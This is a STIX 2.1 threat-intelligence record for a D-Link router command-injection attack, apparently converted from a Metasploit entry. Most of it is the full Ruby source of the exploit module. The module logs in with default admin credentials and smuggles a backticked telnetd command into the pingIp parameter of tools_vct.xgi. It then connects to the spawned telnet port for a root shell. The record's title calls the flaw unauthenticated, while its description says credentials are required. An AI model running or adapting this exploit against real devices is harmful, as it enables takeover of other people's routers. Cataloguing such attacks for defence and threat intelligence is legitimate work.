{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--67d9ff9a-1737-419a-a5f8-c99bb8f72673",
    "created": "2024-08-14T17:04:34.795867Z",
    "modified": "2024-08-14T17:04:34.795872Z",
    "name": "D-Link Devices Unauthenticated Remote Command Execution",
    "description": " Various D-Link Routers are vulnerable to OS command injection via the web interface. The vulnerability exists in tools_vct.xgi, which is accessible with credentials. According to the vulnerability discoverer, more D-Link devices may be affected. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/dlink_dir300_exec_telnet.rb",
            "external_id": "dlink_dir300_exec_telnet.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.s3cur1ty.de/m1adv2013-014"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'D-Link Devices Unauthenticated Remote Command Execution',\n      'Description' => %q{\n        Various D-Link Routers are vulnerable to OS command injection via the web\n        interface. The vulnerability exists in tools_vct.xgi, which is accessible with\n        credentials. According to the vulnerability discoverer, more D-Link devices may\n        be affected.\n      },\n      'Author'      =>\n        [\n          'Michael Messner <devnull[at]s3cur1ty.de>', # Vulnerability discovery and Metasploit module\n          'juan vazquez' # minor help with msf module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'OSVDB', '92698' ],\n          [ 'EDB', '25024' ],\n          [ 'BID', '59405' ],\n          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-014' ]\n        ],\n      'DisclosureDate' => '2013-04-22',\n      'Privileged'     => true,\n      'Platform'       => 'unix',\n      'Arch'        => ARCH_CMD,\n      'Payload'     =>\n        {\n          'Compat'  => {\n            'PayloadType'    => 'cmd_interact',\n            'ConnectionType' => 'find',\n          },\n        },\n      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },\n      'Targets'        =>\n        [\n          [ 'Automatic',\t{ } ],\n        ],\n      'DefaultTarget'  => 0\n      ))\n\n    register_options(\n      [\n        OptString.new('USERNAME',[ true, 'User to login with', 'admin']),\n        OptString.new('PASSWORD',[ false, 'Password to login with', 'admin']),\n\n      ])\n\n    register_advanced_options(\n      [\n        OptInt.new('TelnetTimeout', [ true, 'The number of seconds to wait for a reply from a Telnet command', 10]),\n        OptInt.new('TelnetBannerTimeout', [ true, 'The number of seconds to wait for the initial banner', 25])\n      ])\n  end\n\n  def tel_timeout\n    (datastore['TelnetTimeout'] || 10).to_i\n  end\n\n  def banner_timeout\n    (datastore['TelnetBannerTimeout'] || 25).to_i\n  end\n\n  def exploit\n    user = datastore['USERNAME']\n\n    if datastore['PASSWORD'].nil?\n      pass = \"\"\n    else\n      pass = datastore['PASSWORD']\n    end\n\n    test_login(user, pass)\n    exploit_telnet\n  end\n\n  def test_login(user, pass)\n    print_status(\"#{rhost}:#{rport} - Trying to login with #{user} / #{pass}\")\n\n    login_path = \"/login.php\"\n\n    #valid login response includes the following\n    login_check = \"\\<META\\ HTTP\\-EQUIV\\=Refresh\\ CONTENT\\=\\'0\\;\\ url\\=index.php\\'\\>\"\n\n    begin\n      res = send_request_cgi({\n        'uri' => login_path,\n        'method' => 'POST',\n        'vars_post' => {\n          \"ACTION_POST\" => \"LOGIN\",\n          \"LOGIN_USER\" => \"#{user}\",\n          \"LOGIN_PASSWD\" => \"#{pass}\",\n          \"login\" => \"+Log+In+\"\n          }\n      })\n      if res.nil?\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Could not connect to the webservice - no response\")\n      end\n      if (res.headers['Server'].nil? or res.headers['Server'] !~ /Mathopd\\/1.5p6/)\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Could not connect to the webservice - check the server banner\")\n      end\n      if (res.code == 404)\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Could not connect to the webservice - 404 error\")\n      end\n\n      if (res.body) =~ /#{login_check}/\n        print_good(\"#{rhost}:#{rport} - Successful login #{user}/#{pass}\")\n      else\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}\")\n      end\n\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Could not connect to the webservice\")\n    end\n  end\n\n  def exploit_telnet\n    telnetport = rand(32767) + 32768\n\n    print_status(\"#{rhost}:#{rport} - Telnetport: #{telnetport}\")\n\n    cmd = \"telnetd -p #{telnetport}\"\n\n    #starting the telnetd gives no response\n    request(cmd)\n\n    print_status(\"#{rhost}:#{rport} - Trying to establish a telnet connection...\")\n    ctx = { 'Msf' => framework, 'MsfExploit' => self }\n    sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => telnetport.to_i, 'Context' => ctx })\n\n    if sock.nil?\n      fail_with(Failure::Unreachable, \"#{rhost}:#{rport} - Backdoor service has not been spawned!!!\")\n    end\n\n    add_socket(sock)\n\n    print_status(\"#{rhost}:#{rport} - Trying to establish a telnet session...\")\n    prompt = negotiate_telnet(sock)\n    if prompt.nil?\n      sock.close\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to establish a telnet session\")\n    else\n      print_good(\"#{rhost}:#{rport} - Telnet session successfully established...\")\n    end\n\n    handler(sock)\n  end\n\n  def request(cmd)\n\n    uri = '/tools_vct.xgi'\n\n    begin\n      res = send_request_cgi({\n        'uri'    => uri,\n        'vars_get'\t=> {\n          'set/runtime/switch/getlinktype' => \"1\",\n          'set/runtime/diagnostic/pingIp' => \"`#{cmd}`\",\n          'pingIP' => \"\"\n          },\n        'method' => 'GET',\n      })\n    return res\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{rhost}:#{rport} - Could not connect to the webservice\")\n    end\n  end\n\n  # Since there isn't user/password negotiation, just wait until the prompt is there\n  def negotiate_telnet(sock)\n    begin\n      Timeout.timeout(banner_timeout) do\n        while(true)\n          data = sock.get_once(-1, tel_timeout)\n          return nil if not data or data.length == 0\n          if data =~ /\\x23\\x20$/\n            return true\n          end\n        end\n      end\n    rescue ::Timeout::Error\n      return nil\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-04-22",
    "x_mitre_platforms": [
        "unix'"
    ]
}